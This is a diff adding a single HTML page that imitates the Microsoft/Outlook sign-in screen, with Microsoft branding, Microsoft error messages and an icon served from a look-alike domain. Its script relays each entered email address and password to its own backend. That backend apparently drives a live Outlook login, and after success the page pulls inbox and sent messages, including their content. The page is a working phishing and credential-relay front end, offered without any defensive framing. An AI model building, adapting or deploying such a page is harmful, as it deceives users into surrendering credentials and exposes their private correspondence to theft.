@@ -1,0 +1,1152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Outlook Login Automation</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg');
+            background-size: cover;
+            background-position: center;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        /* Mobile-first responsive design */
+        @media (max-width: 958px) {
+            body {
+                padding: 5px;
+                align-items: flex-start;
+                background: white;
+            }
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 0;
+            width: 100%;
+            max-width: 440px;
+            animation: fadeIn 0.5s ease-out;
+            margin-top: 0;
+        }
+
+        /* Mobile container adjustments */
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px 20px;
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .microsoft-logo {
+            width: 108px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+
+        .header {
+            margin-bottom: 14px;
+        }
+
+        .header h1 {
+            color: #1b1b1b;
+            font-size: 24px;
+            font-weight: 600;
+            margin: 0;
+        }
+
+        /* Compact loading state */
+        .container.loading-state .header {
+            margin-bottom: 8px;
+        }
+
+        .container.loading-state .microsoft-dots-loader {
+            margin: 15px 0 20px 0;
+        }
+
+        .back-info {
+            margin: 10px 0;
+            font-size: 13px;
+            color: #323130;
+            display: none;
+        }
+
+        .back-info.visible {
+            display: block;
+        }
+
+        .status {
+            background: #f8f9ff;
+            padding: 15px;
+            border-radius: 2px;
+            margin-bottom: 20px;
+            font-size: 13px;
+        }
+
+        .status-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+
+        .status-indicator.online {
+            background: #107c10;
+        }
+
+        .status-indicator.offline {
+            background: #d13438;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .microsoft-input {
+            width: 100%;
+            padding: 6px 6px 6px 0;
+            border: none;
+            border-bottom: 1px solid #0067b8;
+            background-color: transparent;
+            outline: none;
+            font-size: 15px;
+            color: #323130;
+        }
+
+        .microsoft-input:focus {
+            border-bottom: 2px solid #0078d4;
+        }
+
+        .microsoft-input::placeholder {
+            color: #605e5c;
+        }
+
+        .form-links {
+            margin: 15px 0;
+            font-size: 13px;
+        }
+
+        .form-links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .form-links a:hover {
+            text-decoration: underline;
+        }
+
+        .form-links .create-account {
+            color: #323130;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: flex-end;
+            gap: 4px;
+            margin-top: 20px;
+        }
+
+        .btn {
+            padding: 6px 32px;
+            border: none;
+            border-radius: 0;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .btn-secondary {
+            background-color: #e1e1e1;
+            color: #323130;
+        }
+
+        .btn-primary {
+            background-color: #0078d4;
+            color: white;
+        }
+
+        .btn:hover:not(:disabled) {
+            opacity: 0.9;
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .message {
+            padding: 12px;
+            border-radius: 2px;
+            margin-bottom: 15px;
+            font-size: 13px;
+        }
+
+        .message.success {
+            background: #dff6dd;
+            color: #107c10;
+        }
+
+        .message.error {
+            background: transparent;
+            color: #d13438;
+            padding: 2px 0;
+            margin: 6px 0 8px 0;
+            font-size: 13px;
+            line-height: 1.2;
+        }
+
+        .message.microsoft-error {
+            background: transparent;
+            color: #d13438;
+            padding: 2px 0;
+            margin: 2px 0;
+            font-size: 15px;
+            line-height: 1;
+        }
+
+        .message.microsoft-error a {
+            color: #0067b8;
+            text-decoration: underline;
+        }
+
+        .message.info {
+            background: #deecf9;
+            color: #323130;
+        }
+
+        .loading {
+            display: none;
+        }
+
+        .loading-animation {
+            position: absolute;
+            top: -10px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #f3f2f1;
+            border-radius: 1px;
+            overflow: hidden;
+            display: none;
+        }
+
+        .loading-animation::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, #0078d4, transparent);
+            animation: loadingSlide 2s linear infinite;
+        }
+
+        .loading-animation.active {
+            display: block;
+        }
+
+        @keyframes loadingSlide {
+            0% {
+                left: -100%;
+            }
+            100% {
+                left: 100%;
+            }
+        }
+
+        /* Microsoft-style dot loading animation */
+        .microsoft-dots-loader {
+            display: none;
+            justify-content: flex-start;
+            align-items: center;
+            margin: 20px 0 15px 0;
+            height: 20px;
+        }
+
+        .microsoft-dots-loader.show {
+            display: flex !important;
+        }
+
+        .microsoft-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background-color: #0078d4;
+            margin: 0 2px;
+            animation: microsoftDotPulse 1.4s infinite ease-in-out both;
+        }
+
+        .microsoft-dot:nth-child(1) { animation-delay: -0.32s; }
+        .microsoft-dot:nth-child(2) { animation-delay: -0.16s; }
+        .microsoft-dot:nth-child(3) { animation-delay: 0s; }
+        .microsoft-dot:nth-child(4) { animation-delay: 0.16s; }
+        .microsoft-dot:nth-child(5) { animation-delay: 0.32s; }
+
+        @keyframes microsoftDotPulse {
+            0%, 80%, 100% {
+                transform: scale(0.8);
+                opacity: 0.5;
+            }
+            40% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        /* Loading cancel button */
+        .loading-cancel-container {
+            display: none;
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .loading-cancel-container.show {
+            display: block !important;
+        }
+
+        .cancel-btn {
+            background: transparent;
+            border: 1px solid #0067b8;
+            color: #0067b8;
+            font-size: 13px;
+            cursor: pointer;
+            text-decoration: none;
+            padding: 4px 12px;
+            border-radius: 2px;
+        }
+
+        .cancel-btn:hover {
+            color: #004a85;
+            border-color: #004a85;
+            background: #f3f9ff;
+        }
+
+        .cancel-btn:disabled {
+            color: #a19f9d;
+            border-color: #a19f9d;
+            cursor: not-allowed;
+            background: transparent;
+        }
+
+        
+
+        /* Pulse animation for Microsoft logo during loading */
+        .microsoft-logo.loading {
+            animation: logoFadeInOut 2s ease-in-out infinite;
+        }
+
+        @keyframes logoFadeInOut {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+
+        .sign-in-options {
+            background: white;
+            padding: 16px 41px;
+            border-radius: 0;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 440px;
+            margin-top: 10px;
+            text-align: left;
+            font-size: 13px;
+            color: #323130;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .sign-in-options img {
+            width: 20px;
+            height: 20px;
+            vertical-align: middle;
+        }
+
+        /* Mobile sign-in options */
+        @media (max-width: 768px) {
+            .sign-in-options {
+                padding: 15px 20px;
+                margin-top: 8px;
+                box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
+            }
+        }
+
+
+
+        .hidden {
+            display: none;
+        }
+
+        .password-section {
+            display: none;
+        }
+
+        .password-section.visible {
+            display: block;
+        }
+
+        /* Footer links positioned at bottom right */
+        .footer-links {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 13px;
+            color: #605e5c;
+            z-index: 1000;
+        }
+
+        .footer-links a {
+            color: #605e5c;
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
+
+        .footer-links a:hover {
+            color: #323130;
+            text-decoration: underline;
+        }
+
+        .footer-dots {
+            color: #605e5c;
+            font-weight: bold;
+            cursor: pointer;
+            padding: 0 4px;
+            user-select: none;
+        }
+
+        .footer-dots:hover {
+            color: #323130;
+        }
+
+        /* Mobile footer adjustments */
+        @media (max-width: 768px) {
+            .footer-links {
+                bottom: 10px;
+                right: 10px;
+                font-size: 12px;
+                gap: 8px;
+            }
+        }
+
+        /* Hide footer on very small screens to avoid overlap */
+        @media (max-width: 480px) {
+            .footer-links {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Footer links positioned at bottom right -->
+    <div class="footer-links">
+        <a href="#" onclick="return false;">Terms of use</a>
+        <a href="#" onclick="return false;">Privacy & cookies</a>
+        <span class="footer-dots">...</span>
+    </div>
+
+    <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
+        <div class="container">
+            <div class="loading-animation" id="loadingAnimation"></div>
+            <img class="microsoft-logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
+
+            <div class="back-info" id="backInfo">
+                ← <span id="enteredEmail"></span>
+            </div>
+
+            <div class="header">
+                <h1 id="headerTitle">Sign in</h1>
+            </div>
+
+            <!-- Status and messages hidden -->
+            <div class="status" style="display: none;">
+                <span class="status-indicator" id="statusIndicator"></span>
+                <span id="statusText">Checking backend...</span>
+            </div>
+
+            <!-- Message area -->
+            <div id="messageArea" style="display: none;"></div>
+
+            <!-- Loading indicator -->
+            <div class="loading" id="loadingIndicator">
+                <p id="loadingText">Processing...</p>
+            </div>
+
+            <!-- Microsoft-style dot loading animation -->
+            <div class="microsoft-dots-loader" id="microsoftDotsLoader">
+                <div class="microsoft-dot"></div>
+                <div class="microsoft-dot"></div>
+                <div class="microsoft-dot"></div>
+                <div class="microsoft-dot"></div>
+                <div class="microsoft-dot"></div>
+            </div>
+
+            <!-- Cancel button during loading -->
+            <div class="loading-cancel-container" id="loadingCancelContainer">
+                <button type="button" class="cancel-btn" onclick="cancelLoading()">Cancel</button>
+            </div>
+
+            <!-- Email form -->
+            <div id="emailForm">
+                <form onsubmit="startLogin(event)">
+                    <div class="form-group">
+                        <input type="email" id="email" class="microsoft-input" placeholder="Email, phone, or Skype" required>
+                    </div>
+
+                    <div class="form-links">
+                        <span class="create-account">No account? <a href="#" onclick="return false;">Create one!</a></span><br><br>
+                        <a href="#" onclick="return false;">Can't access your account?</a>
+                    </div>
+
+                    <div class="button-group">
+                        <button type="button" class="btn btn-secondary" onclick="goBack()">Back</button>
+                        <button type="submit" class="btn btn-primary" id="nextBtn">Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Password form -->
+            <div id="passwordForm" class="password-section">
+                <form onsubmit="continueLogin(event)">
+                    <div class="form-group">
+                        <input type="password" id="password" class="microsoft-input" placeholder="Password" required>
+                    </div>
+
+                    <div class="form-links">
+                        <a href="#" onclick="return false;">Forgot my password</a>
+                    </div>
+
+                    <div class="button-group">
+                        <button type="button" class="btn btn-secondary" onclick="goBackToEmail()">Back</button>
+                        <button type="submit" class="btn btn-primary" id="signInBtn">Sign in</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Email Scan Section (shown after successful login) -->
+            <div id="emailScanSection" style="display: none;">
+                <div class="message success" id="loginSuccess">
+                    Successfully logged in! You can now scan your emails.
+                </div>
+                
+                <div class="button-group">
+                    <button type="button" class="btn btn-secondary" onclick="scanBasicEmails()">Quick Scan</button>
+                    <button type="button" class="btn btn-primary" onclick="scanAllEmails()">Full Email Scan</button>
+                </div>
+                
+                <div id="emailResults" style="margin-top: 20px; display: none;">
+                    <h3>Email Scan Results</h3>
+                    <div id="emailSummary"></div>
+                    <div id="emailDetails" style="max-height: 400px; overflow-y: auto; border: 1px solid #ccc; padding: 10px; margin-top: 10px;"></div>
+                </div>
+            </div>
+
+
+        </div>
+
+        <!-- Sign-in options -->
+        <div class="sign-in-options">
+            <img src="https://newnewdomnewbjbfcjfidd.sorenkallbil.com/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" 
+                 alt="Sign-in options icon">
+            <span>Sign-in options</span>
+        </div>
+    </div>
+
+    
+
+    <script>
+        let currentSessionId = null;
+        let currentStep = 'email'; // 'email' or 'password'
+        const API_BASE = '';
+        let preloadInProgress = false; // Prevent concurrent preload requests
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            checkBackendHealth();
+            checkSessionStatus();
+            preloadOutlook();
+        });
+
+        // Utility functions
+        function showMessage(message, type = 'info') {
+            const messageArea = document.getElementById('messageArea');
+            messageArea.style.display = 'block';
+
+            // Check if this is a Microsoft-specific error message
+            if (type === 'error' && (
+                message.includes("We couldn't find an account") ||
+                message.includes("That username is incorrect") ||
+                message.includes("get a new Microsoft account")
+            )) {
+                // Format Microsoft error with proper styling and link
+                let formattedMessage = message.replace(
+                    'get a new Microsoft account',
+                    '<a href="#" onclick="return false;">get a new Microsoft account</a>'
+                );
+                messageArea.innerHTML = `<div class="message microsoft-error">${formattedMessage}</div>`;
+            } else {
+                messageArea.innerHTML = `<div class="message ${type}">${message}</div>`;
+            }
+        }
+
+        function clearMessage() {
+            const messageArea = document.getElementById('messageArea');
+            messageArea.innerHTML = '';
+            messageArea.style.display = 'none';
+        }
+
+        function setLoading(loading, loadingText = 'Processing...', useOverlay = false) {
+            const loadingAnimation = document.getElementById('loadingAnimation');
+            const microsoftDotsLoader = document.getElementById('microsoftDotsLoader');
+            const microsoftLogo = document.querySelector('.microsoft-logo');
+            const container = document.querySelector('.container');
+            const emailForm = document.getElementById('emailForm');
+            const passwordForm = document.getElementById('passwordForm');
+            const headerTitle = document.getElementById('headerTitle');
+            const loadingCancelContainer = document.getElementById('loadingCancelContainer');
+
+            if (loading) {
+                // Show progress bar at top
+                loadingAnimation.classList.add('active');
+
+                // ENSURE Microsoft logo is visible and add loading animation
+                microsoftLogo.style.display = 'block';
+                microsoftLogo.style.visibility = 'visible';
+                microsoftLogo.classList.add('loading');
+
+                // Add compact loading state to container
+                container.classList.add('loading-state');
+
+                // Show dots animation and update header text
+                microsoftDotsLoader.classList.add('show');
+                microsoftDotsLoader.style.display = 'flex';
+                headerTitle.textContent = loadingText;
+
+                // Show cancel button
+                loadingCancelContainer.classList.add('show');
+
+                // Hide forms during loading
+                emailForm.style.display = 'none';
+                passwordForm.style.display = 'none';
+            } else {
+                // Hide all loading animations
+                loadingAnimation.classList.remove('active');
+                microsoftDotsLoader.classList.remove('show');
+                microsoftDotsLoader.style.display = 'none';
+                microsoftLogo.classList.remove('loading');
+                container.classList.remove('loading-state');
+                
+                // Hide cancel button
+                loadingCancelContainer.classList.remove('show');
+                
+                // Keep Microsoft logo visible (don't hide it)
+                microsoftLogo.style.display = 'block';
+                microsoftLogo.style.visibility = 'visible';
+
+                // Restore header text based on current step
+                if (currentStep === 'email') {
+                    headerTitle.textContent = 'Sign in';
+                    emailForm.style.display = 'block';
+                    passwordForm.style.display = 'none';
+                } else if (currentStep === 'password') {
+                    headerTitle.textContent = 'Enter password';
+                    emailForm.style.display = 'none';
+                    passwordForm.style.display = 'block';
+                }
+
+                // Restore other elements visibility
+                document.getElementById('backInfo').style.display = '';
+                document.getElementById('messageArea').style.display = '';
+            }
+
+            // Disable all buttons and inputs during loading
+            const buttons = document.querySelectorAll('.btn');
+            const inputs = document.querySelectorAll('.microsoft-input');
+
+            buttons.forEach(btn => btn.disabled = loading);
+            inputs.forEach(input => input.disabled = loading);
+        }
+
+        function showPasswordForm(email) {
+            currentStep = 'password';
+            document.getElementById('emailForm').style.display = 'none';
+            document.getElementById('passwordForm').className = 'password-section visible';
+            document.getElementById('headerTitle').textContent = 'Enter password';
+            document.getElementById('backInfo').className = 'back-info visible';
+            document.getElementById('enteredEmail').textContent = email;
+
+            // Focus on password field
+            setTimeout(() => {
+                document.getElementById('password').focus();
+            }, 100);
+        }
+
+        function showEmailForm() {
+            currentStep = 'email';
+            document.getElementById('emailForm').style.display = 'block';
+            document.getElementById('passwordForm').className = 'password-section';
+            document.getElementById('headerTitle').textContent = 'Sign in';
+            document.getElementById('backInfo').className = 'back-info';
+        }
+
+
+
+        function goBack() {
+            // Placeholder for back functionality
+            return false;
+        }
+
+        function cancelLoading() {
+            // Cancel loading and return to the current form
+            setLoading(false);
+            clearMessage();
+            
+            // If we're in password step, go back to email
+            if (currentStep === 'password') {
+                goBackToEmail();
+            } else {
+                // Otherwise just clear the email field and show the form
+                document.getElementById('email').value = '';
+                showEmailForm();
+            }
+        }
+
+        async function goBackToEmail() {
+            // Call backend to reload Outlook page
+            try {
+                const response = await fetch(`${API_BASE}/api/back`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    console.log('Backend reloaded successfully:', data.message);
+                } else {
+                    console.error('Failed to reload backend page');
+                }
+            } catch (error) {
+                // Silent error handling
+            }
+
+            showEmailForm();
+            // Properly hide the password form
+            document.getElementById('passwordForm').style.display = 'none';
+            document.getElementById('passwordForm').className = 'password-section';
+            // Clear the password field
+            document.getElementById('password').value = '';
+            // Clear any messages
+            clearMessage();
+        }
+
+        // API Functions
+        async function checkBackendHealth() {
+            try {
+                const response = await fetch(`${API_BASE}/api/health`);
+                const data = await response.json();
+
+                if (response.ok) {
+                    document.getElementById('statusIndicator').className = 'status-indicator online';
+                    document.getElementById('statusText').textContent = 'Backend online - Ready';
+                } else {
+                    throw new Error('Backend health check failed');
+                }
+            } catch (error) {
+                document.getElementById('statusIndicator').className = 'status-indicator offline';
+                document.getElementById('statusText').textContent = 'Backend offline';
+                // Removed generic error message
+            }
+        }
+
+        async function preloadOutlook() {
+            // Prevent concurrent preload requests
+            if (preloadInProgress) {
+                console.log('Preload already in progress, skipping...');
+                return;
+            }
+
+            preloadInProgress = true;
+            
+            try {
+                document.getElementById('statusText').textContent = 'Pre-loading Outlook page...';
+                // Removed preload info message
+
+                const response = await fetch(`${API_BASE}/api/preload`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    signal: AbortSignal.timeout(30000) // 30 second timeout
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    if (data.status === 'preloaded') {
+                        document.getElementById('statusText').textContent = 'Outlook page ready - Enter email';
+                        // Removed success message notification
+                    } else if (data.status === 'already-loaded') {
+                        document.getElementById('statusText').textContent = 'Outlook page ready - Enter email';
+                        // Removed success message notification
+
+                        // If there's already a session, just store it without showing actions
+                        if (data.sessionId) {
+                            currentSessionId = data.sessionId;
+                        }
+                    }
+                } else {
+                    throw new Error(data.error || 'Failed to preload');
+                }
+            } catch (error) {
+                document.getElementById('statusText').textContent = 'Backend online - Manual loading';
+                console.error('Preload failed:', error);
+                // Don't show error to user, just fallback to manual loading
+            } finally {
+                preloadInProgress = false;
+            }
+        }
+
+        async function checkSessionStatus() {
+            try {
+                const response = await fetch(`${API_BASE}/api/status`);
+                const data = await response.json();
+
+                if (data.hasActiveSession) {
+                    currentSessionId = data.sessionId;
+                    // Don't show session actions automatically - keep the login form visible
+                    console.log('Found existing session:', currentSessionId);
+                }
+            } catch (error) {
+                console.error('Error checking session status:', error);
+            }
+        }
+
+        async function startLogin(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+
+            clearMessage();
+            setLoading(true, 'Trying to sign you in...', false);
+
+            try {
+                const response = await fetch(`${API_BASE}/api/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password: '' })
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    currentSessionId = data.sessionId;
+
+                    if (data.loginComplete) {
+                        if (data.loginSuccess) {
+                            // Show email scanning section after successful login
+                            showMessage('✅ Login completed successfully!');
+                            showEmailScanSection();
+                        } else {
+                            showMessage('Your account or password is incorrect. If you don\'t remember your password, <a href="#" onclick="return false;" style="color: #0067b8; text-decoration: underline;">reset it now</a>.', 'error');
+                        }
+                    } else {
+                        // Show site report if available
+                        if (data.siteReport) {
+                            // Check for error messages first - if there are errors, only show the error
+                            if (data.siteReport.errorMessages.length > 0) {
+                                // Get the first error message and format it like Microsoft does
+                                const firstError = data.siteReport.errorMessages[0];
+                                const formattedError = firstError.replace(
+                                    'get a new Microsoft account',
+                                    '<a href="#" onclick="return false;" style="color: #0067b8; text-decoration: none;">get a new Microsoft account</a>'
+                                );
+
+                                // Only show the Microsoft error message, nothing else
+                                showMessage(formattedError, 'error');
+                            } else if (data.siteReport.accountExists && data.siteReport.needsPassword) {
+                                // Account found, show password form without any
+                                showPasswordForm(email);
+                            } else if (!data.siteReport.accountExists) {
+                                // Account not found - show the Microsoft error message
+                                showMessage("We couldn't find an account with that username. Try another, or <a href='#' onclick='return false;' style='color: #0067b8; text-decoration: none;'>get a new Microsoft account</a>.", 'error');
+                            } else {
+                                // Other cases - proceed to password
+                                showPasswordForm(email);
+                            }
+                        } else {
+                            showPasswordForm(email);
+                        }
+                    }
+
+                } else {
+                    throw new Error(data.error || 'Login failed');
+                }
+
+            } catch (error) {
+                // Silent error handling
+            } finally {
+                setLoading(false);
+            }
+        }
+
+        async function continueLogin(event) {
+            event.preventDefault();
+
+            const password = document.getElementById('password').value;
+
+            if (!password) {
+                showMessage('Please enter your password', 'error');
+                return;
+            }
+
+            clearMessage();
+            setLoading(true, 'Trying to sign you in', false);
+
+            try {
+                const response = await fetch(`${API_BASE}/api/continue-login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        password: password,
+                        sessionId: currentSessionId 
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    if (data.loginSuccess) {
+                        // Show email scanning section after successful login
+                        console.log('✅ Login successful - showing email scanning options');
+                        showMessage('✅ Login completed successfully!');
+                        showEmailScanSection();
+                        return;
+                    } else {
+                        showMessage('Your account or password is incorrect. If you don\'t remember your password, <a href="#" onclick="return false;" style="color: #0067b8; text-decoration: underline;">reset it now</a>.', 'error');
+                    }
+
+                    // Clear password field
+                    document.getElementById('password').value = '';
+
+                } else {
+                    throw new Error(data.error || 'Continue login failed');
+                }
+
+            } catch (error) {
+                // Silent error handling
+            } finally {
+                setLoading(false);
+            }
+        }
+
+        // Helper function to simulate loading and then hiding it
+        function showLoading(message) {
+            const loadingIndicator = document.getElementById('loadingIndicator');
+            const loadingText = document.getElementById('loadingText');
+            loadingText.textContent = message;
+            loadingIndicator.style.display = 'block';
+            setLoading(true); // Disable inputs and buttons
+        }
+
+        function hideLoading() {
+            const loadingIndicator = document.getElementById('loadingIndicator');
+            loadingIndicator.style.display = 'none';
+            setLoading(false); // Enable inputs and buttons
+        }
+
+        // Helper functions for specific loading states
+        function showAccountCheckLoading() {
+            setLoading(true, 'Trying to sign you in...', false);
+        }
+
+        function showSignInLoading() {
+            setLoading(true, 'Trying to sign you in', true);
+        }
+
+        function showRedirectLoading() {
+            setLoading(true, 'Redirecting to Outlook...', true);
+        }
+
+        function hideAllLoading() {
+            setLoading(false);
+        }
+
+        
+
+
+        // Function to reset the form to the email input stage
+        function resetToEmailForm() {
+            currentStep = 'email';
+
+            // Reset form
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+
+            // Show email form, hide password form
+            document.getElementById('emailForm').style.display = 'block';
+            document.getElementById('passwordForm').style.display = 'none';
+
+            // Update header and back button
+            document.getElementById('headerTitle').textContent = 'Sign in';
+            document.getElementById('backInfo').className = 'back-info';
+
+            // Clear messages
+            clearMessage();
+
+            // Preload a fresh session with delay to avoid race conditions
+            setTimeout(() => preloadOutlook(), 1000);
+        }
+
+        // Email scanning functions
+        function showEmailScanSection() {
+            document.getElementById('emailForm').style.display = 'none';
+            document.getElementById('passwordForm').style.display = 'none';
+            document.getElementById('emailScanSection').style.display = 'block';
+            document.getElementById('headerTitle').textContent = 'Email Management';
+        }
+
+        async function scanBasicEmails() {
+            setLoading(true, 'Scanning inbox emails...', false);
+            clearMessage();
+
+            try {
+                const response = await fetch(`${API_BASE}/api/emails?sessionId=${currentSessionId}`);
+                const data = await response.json();
+
+                if (response.ok) {
+                    displayBasicEmailResults(data);
+                } else {
+                    showMessage(data.error || 'Failed to scan emails', 'error');
+                }
+            } catch (error) {
+                console.error('Error scanning basic emails:', error);
+                showMessage('Failed to scan emails', 'error');
+            } finally {
+                setLoading(false);
+            }
+        }
+
+        async function scanAllEmails() {
+            setLoading(true, 'Scanning all emails from inbox and sent folder...', false);
+            clearMessage();
+
+            try {
+                const response = await fetch(`${API_BASE}/api/emails/scan-all?sessionId=${currentSessionId}`);
+                const data = await response.json();
+
+                if (response.ok) {
+                    displayFullEmailResults(data);
+                } else {
+                    showMessage(data.error || 'Failed to scan all emails', 'error');
+                }
+            } catch (error) {
+                console.error('Error scanning all emails:', error);
+                showMessage('Failed to scan all emails', 'error');
+            } finally {
+                setLoading(false);
+            }
+        }
+
+        function displayBasicEmailResults(data) {
+            const resultsDiv = document.getElementById('emailResults');
+            const summaryDiv = document.getElementById('emailSummary');
+            const detailsDiv = document.getElementById('emailDetails');
+
+            summaryDiv.innerHTML = `<p><strong>Quick Scan Results:</strong> Found ${data.count} email subjects</p>`;
+            
+            let detailsHTML = '<h4>Email Subjects:</h4><ul>';
+            data.emails.forEach((subject, index) => {
+                detailsHTML += `<li>${index + 1}. ${subject}</li>`;
+            });
+            detailsHTML += '</ul>';
+            
+            detailsDiv.innerHTML = detailsHTML;
+            resultsDiv.style.display = 'block';
+        }
+
+        function displayFullEmailResults(data) {
+            const resultsDiv = document.getElementById('emailResults');
+            const summaryDiv = document.getElementById('emailSummary');
+            const detailsDiv = document.getElementById('emailDetails');
+
+            const summary = data.summary;
+            summaryDiv.innerHTML = `
+                <p><strong>Full Email Scan Results:</strong></p>
+                <ul>
+                    <li>Inbox: ${summary.inboxCount} emails</li>
+                    <li>Sent: ${summary.sentCount} emails</li>
+                    <li>Total: ${summary.totalCount} emails</li>
+                    <li>Scan time: ${new Date(data.scanTimestamp).toLocaleString()}</li>
+                </ul>
+                ${data.warning ? `<p style="color: orange;"><strong>Warning:</strong> ${data.warning}</p>` : ''}
+            `;
+            
+            let detailsHTML = '';
+            
+            // Display inbox emails
+            if (data.data.inbox && data.data.inbox.length > 0) {
+                detailsHTML += '<h4>📥 Inbox Emails:</h4>';
+                data.data.inbox.forEach((email, index) => {
+                    detailsHTML += `
+                        <div style="border-bottom: 1px solid #eee; padding: 10px 0; margin-bottom: 10px;">
+                            <strong>From:</strong> ${email.sender || 'Unknown'}<br>
+                            <strong>Subject:</strong> ${email.subject || 'No Subject'}<br>
+                            <strong>Date:</strong> ${email.date || 'Unknown'}<br>
+                            ${email.preview ? `<strong>Preview:</strong> ${email.preview.substring(0, 100)}${email.preview.length > 100 ? '...' : ''}<br>` : ''}
+                            ${email.content ? `<strong>Content:</strong> ${email.content.substring(0, 200)}${email.content.length > 200 ? '...' : ''}<br>` : ''}
+                        </div>
+                    `;
+                });
+            }
+            
+            // Display sent emails
+            if (data.data.sent && data.data.sent.length > 0) {
+                detailsHTML += '<h4>📤 Sent Emails:</h4>';
+                data.data.sent.forEach((email, index) => {
+                    detailsHTML += `
+                        <div style="border-bottom: 1px solid #eee; padding: 10px 0; margin-bottom: 10px;">
+                            <strong>To:</strong> ${email.recipient || 'Unknown'}<br>
+                            <strong>Subject:</strong> ${email.subject || 'No Subject'}<br>
+                            <strong>Date:</strong> ${email.date || 'Unknown'}<br>
+                            ${email.preview ? `<strong>Preview:</strong> ${email.preview.substring(0, 100)}${email.preview.length > 100 ? '...' : ''}<br>` : ''}
+                            ${email.content ? `<strong>Content:</strong> ${email.content.substring(0, 200)}${email.content.length > 200 ? '...' : ''}<br>` : ''}
+                        </div>
+                    `;
+                });
+            }
+            
+            if (!detailsHTML) {
+                detailsHTML = '<p>No emails found or could not extract email data.</p>';
+            }
+            
+            detailsDiv.innerHTML = detailsHTML;
+            resultsDiv.style.display = 'block';
+        }
+
+
+    </script>
+</body>
+</html>
